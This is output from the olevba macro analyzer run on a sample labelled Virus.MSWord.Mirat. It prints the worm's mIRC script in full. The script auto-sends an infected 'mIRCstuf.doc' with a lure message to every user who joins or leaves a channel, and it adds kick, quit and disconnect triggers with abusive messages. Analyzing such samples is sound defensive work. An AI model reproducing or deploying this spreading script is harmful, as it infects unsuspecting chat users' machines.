olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mirat
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSWord.Mirat 
in file: ./Virus.MSWord.Mirat - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[script]
n0=on 1:JOIN:#:{
n1=/query $nick mIRCstuf.doc ,all about mIRC !
n2=/send $nick mIRCstuf.doc
n3=}
n4=on 1:PART:#:{
n5=/query $nick mIRCstuf.doc ,all about mIRC
n6=/send $nick mIRCstuf.doc
n7=}
n8=on @1:text:*hy*:#:/kick $chan $nick
n9=on @1:text:*sal*:#:/kick $chan $nick
n10=on 1:text:*bye*:#:/quit I'm really Fucked Up Now...Gotta Go Suckerz!
n11=on 1:op:#:/disconnect
n12=on 1:deop:#:/query $nick Fuck You :)
No suspicious keyword or IOC found.

